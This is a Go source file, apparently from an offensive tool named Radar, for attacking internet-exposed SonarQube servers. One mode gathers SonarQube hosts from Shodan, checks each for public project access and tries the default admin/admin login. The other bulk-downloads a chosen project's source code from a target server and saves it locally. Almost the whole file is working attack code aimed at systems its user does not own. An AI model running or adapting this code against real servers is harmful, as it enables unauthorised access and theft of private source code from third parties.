package scanner

import (
	"fmt"
	"flag"
	"strings"

	"html"
	"regexp"

	"net"
	"sync"

	"strconv"
	"encoding/json"

	"radar/core"
	"radar/model"
)

var (
	SONAR_URL_FORMAT = "http://%s:%d%s"
	
	SONAR_LOGIN_PATH = "/api/authentication/login"
	SONAR_PUBLIC_PROJECT_PATH = "/api/users/current"
	SONAR_PROJECT_COUNT_PATH = "/api/components/search_projects"
	SONAR_PROJECT_ISSUE_COUNT_PATH = "/api/issues/search?resolved=false&facets=types&ps=1&additionalFields=_all"

	SONAR_PROJECT_COMPONENT_PATH = "/api/measures/component_tree?"
	SONAR_PROJECT_COMPONENT_PARAM = "metricKeys=ncloc&component=%s&p=%d&ps=%d"
	SONAR_PROJECT_SOURCE_CODE_PATH = "/api/sources/lines?key=%s"

	SONAR_DEFAULT_USER = "admin"
	SONAR_DEFAULT_PASSWORD = "admin"
)

type SonarQubeScanner struct {
	Menu *flag.FlagSet

	AttackType string

	ShodanApiKey string

	Port int
	Hostname string
	ProjectKey string
}

func NewSonarQubeScanner() (*SonarQubeScanner){
	sonarQubeScanner := &SonarQubeScanner {}

	menu := flag.NewFlagSet("sonarqube", flag.ExitOnError)

	menu.StringVar(&sonarQubeScanner.AttackType, "aT", "scan", "attack type: scan | scd (source code download)")

	menu.StringVar(&sonarQubeScanner.ShodanApiKey, "aK", "", "shodan api key (Required when attacktype scan)")

	menu.IntVar(&sonarQubeScanner.Port, "p", 9000, "sonarqube port (Required when attacktype scd)")
	menu.StringVar(&sonarQubeScanner.Hostname, "host", "", "sonarqube hostname or IP (Required when attacktype scd)")
	menu.StringVar(&sonarQubeScanner.ProjectKey, "pK", "", "project key that want to download source code (Required when attacktype scd)")
	
	sonarQubeScanner.Menu = menu

	return sonarQubeScanner
}

func (sonarqube SonarQubeScanner) Scan() {
	var wg sync.WaitGroup

	if sonarqube.ShodanApiKey == "" {
		core.CustomLogger("error", "Shodan Api Key is required for `scan` attack type", "")
		return
	}

	results := core.ShodanSearch("sonarqube", sonarqube.ShodanApiKey)

	if (len(results.Matches) < 1) {
		core.CustomLogger("warning", "Shodan can not found any record!", "")
		return
	} else {
		core.CustomLogger("warning", fmt.Sprintf("%d Record Detected", len(results.Matches)), "")
	}

	for _, result := range results.Matches {
		status, conn := core.HostControl(result.Port, result.Ip_str)
	
		if (status) {
			go func(r model.SearchResult, c net.Conn) {
				defer c.Close()
				wg.Add(2)
				checkSonarQubePublicProject(r, &wg)
				checkSonarQubeDefaultCredential(r, &wg)
			}(result, conn)
		}
	}

	wg.Wait()
}

func (sonarqube SonarQubeScanner) Scd() {
	var wg sync.WaitGroup
	components := getSonarQubeProjectFiles(sonarqube.Hostname, sonarqube.Port, sonarqube.ProjectKey, 1, 500)

	if (components == nil){
		core.CustomLogger("warning", "Could not found any code folder!", "")
		return
	}

	for i, fileComponent := range components {
		if (core.Contains(fileComponent.Name, core.CommonFileExtensions())) {
			go func(file model.SonarProjectSubComponent) {
				wg.Add(1)
				createSourceCodeFileViaSonarQube(sonarqube.Hostname, sonarqube.Port, sonarqube.ProjectKey, file, &wg)
			}(fileComponent)
		}

		if (i % 5 == 0) {
			wg.Wait()
		}
	}

	wg.Wait()
}

func createSourceCodeFileViaSonarQube(hostname string, port int, projectKey string, file model.SonarProjectSubComponent, wg *sync.WaitGroup) {
	defer wg.Done()

	path := strings.Split(file.Path, file.Name)[0]
		
	err := core.CreateFolder("scd/" + projectKey + "/" + path)
	if (err != nil) {
		return
	}

	f, err := core.CreateFile("scd/" + projectKey + "/" + file.Path)
	if (err != nil) {
		return
	}

	core.CustomLogger("warning", file.Key + " downloading", "")
	codeArray := getSonarQubeProjectCodes(hostname, port, file.Key)

	if (codeArray == nil) {
		f.WriteString("//An error occured when file downloaded")
		core.CustomLogger("error", file.Key + " was not downloaded", "")
		return
	}

	f.WriteString("//This code fetched by Radar")
	for _, line := range codeArray.Sources {
		c := clearHtmlTagFromSonarQubeCodeFile(line.Code)

		f.WriteString("\n")
		f.WriteString(c)
	}

	f.Close()
}

func checkSonarQubePublicProject(searchResult model.SearchResult, wg *sync.WaitGroup) {
	defer wg.Done()

	req, err := core.PrepareRequest("GET", fmt.Sprintf(SONAR_URL_FORMAT, searchResult.Ip_str, searchResult.Port, SONAR_PUBLIC_PROJECT_PATH) , "")
	if (err != nil) {
		return
	}
	
	_, statusCode, _, err := core.SendRequest(req)
	if (err != nil) {
		return
	}

	if (statusCode != 200) {
		core.CustomLogger("fail", fmt.Sprintf("Public Project Not Accessible - %s:%d", searchResult.Ip_str, searchResult.Port), "")
		return
	}

	projectCount := getSonarQubeProjectCount(searchResult) 

	if (projectCount > 0) {
		codeSmell, vulnerability, bug, securityHotspot := getSonarQubeProjectIssuesCount(searchResult)
		core.CustomLogger("success", fmt.Sprintf(
			"Public Project Accessible! - %s:%d\n[*******] Project Count: %d, Code Smell: %d, Vulnerability: %d, Bug: %d, Security Hotspot: %d", 
			searchResult.Ip_str, searchResult.Port, projectCount, codeSmell, vulnerability, bug, securityHotspot), "")
	} else {
		core.CustomLogger("success", fmt.Sprintf("Public Project Accessible But Empty - %s:%d", searchResult.Ip_str, searchResult.Port), "")
	}
}

func checkSonarQubeDefaultCredential(searchResult model.SearchResult, wg *sync.WaitGroup) {
	defer wg.Done()
	
	req, err := core.PrepareRequest("POST", fmt.Sprintf(SONAR_URL_FORMAT, searchResult.Ip_str, searchResult.Port, SONAR_LOGIN_PATH), fmt.Sprintf("login=%s&password=%s", SONAR_DEFAULT_USER, SONAR_DEFAULT_PASSWORD))
	if (err != nil) {
		return
	}
	
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")

	_, statusCode, _, err := core.SendRequest(req)
	if (err != nil) {
		return
	}

	if (statusCode == 200) {
		core.CustomLogger("success", fmt.Sprintf("Default Credential Work - %s:%d", searchResult.Ip_str, searchResult.Port), "")
	} else {
		core.CustomLogger("fail", fmt.Sprintf("Default Credential Not Work - %s:%d", searchResult.Ip_str, searchResult.Port), "")
	}
}

func getSonarQubeProjectCount(searchResult model.SearchResult) (int) {
	result := model.SonarSearchProjects{}

	req, err := core.PrepareRequest("GET", fmt.Sprintf(SONAR_URL_FORMAT, searchResult.Ip_str, searchResult.Port, SONAR_PROJECT_COUNT_PATH), "")
	if (err != nil) {
		return 0
	}
	
	body, _, _, err := core.SendRequest(req)
	if (err != nil) {
		return 0
	}

	err = json.Unmarshal([]byte(body), &result)
	if (err != nil){
		core.CustomLogger("error", "An error occured when deserialize object", err.Error())
		return 0
	}

	return result.Paging.Total
}

func getSonarQubeProjectIssuesCount(searchResult model.SearchResult) (int, int, int, int) {
	result := model.SonarSearchIssues{}
	codeSmell, vulnerability, bug, securityHotspot := 0, 0, 0, 0
	
	req, err := core.PrepareRequest("GET", fmt.Sprintf(SONAR_URL_FORMAT, searchResult.Ip_str, searchResult.Port, SONAR_PROJECT_ISSUE_COUNT_PATH), "")
	if (err != nil) {
		return 0, 0, 0, 0
	}
	
	body, _, _, err := core.SendRequest(req)
	if (err != nil) {
		return 0, 0, 0, 0
	}

	err = json.Unmarshal([]byte(body), &result)
	if (err != nil) {
		core.CustomLogger("error", "An error occured when deserialize object", err.Error())
		return 0, 0, 0, 0
	}

	if (result.Facets != nil) {
		for _, data := range result.Facets[0].Values {
			switch data.Val {
			case "CODE_SMELL":
				codeSmell = data.Count
			case "VULNERABILITY":
				vulnerability = data.Count
			case "BUG":
				bug = data.Count
			case "SECURITY_HOTSPOT":
				securityHotspot = data.Count
			}
		}
	}

	return codeSmell, vulnerability, bug, securityHotspot
}

func getSonarQubeProjectFiles(hostname string, port int, projectKey string, page int, count int) ([]model.SonarProjectSubComponent){
	result := &model.SonarProjectComponentTree{}
	
	req, err := core.PrepareRequest("GET", fmt.Sprintf(SONAR_URL_FORMAT, hostname, port, SONAR_PROJECT_COMPONENT_PATH + fmt.Sprintf(SONAR_PROJECT_COMPONENT_PARAM, projectKey, page, count)) , "")
	if (err != nil) {
		return nil
	}

	body, statusCode, _, err := core.SendRequest(req)
	if (err != nil) {
		return nil
	}

	if (statusCode != 200) {
		core.CustomLogger("error", "Server return error code " + strconv.Itoa(statusCode) + " when fetching code folder", "")
		return nil
	}

	err = json.Unmarshal([]byte(body), &result)
	if (err != nil) {
		core.CustomLogger("error", "An error occured when deserialize object", err.Error())
		return nil
	}

	if (float64(result.Paging.Total) / float64(count) > float64(page)) {
		result.Components = append(result.Components, getSonarQubeProjectFiles(hostname, port, projectKey, page + 1, count)...)
	}

	return result.Components
}

func getSonarQubeProjectCodes(hostname string, port int, projectKey string) (*model.SonarProjectCodes) {
	result := &model.SonarProjectCodes{}
	
	req, err := core.PrepareRequest("GET", fmt.Sprintf(SONAR_URL_FORMAT, hostname, port, fmt.Sprintf(SONAR_PROJECT_SOURCE_CODE_PATH, projectKey)) , "")
	if (err != nil) {
		return nil
	}

	body, statusCode, _, err := core.SendRequest(req)
	if (err != nil) {
		return nil
	}

	if (statusCode != 200) {
		core.CustomLogger("error", "Server return error code " + strconv.Itoa(statusCode), "")
		return nil
	}

	err = json.Unmarshal([]byte(body), &result)
	if (err != nil) {
		core.CustomLogger("error", "An error occured when deserialize object", err.Error())
		return nil
	}

	return result
}

func clearHtmlTagFromSonarQubeCodeFile(code string) (string) {
	regex := regexp.MustCompile(`<.*?>`)
	c := regex.ReplaceAllString(code, "")
	c = html.UnescapeString(c)

	return c
}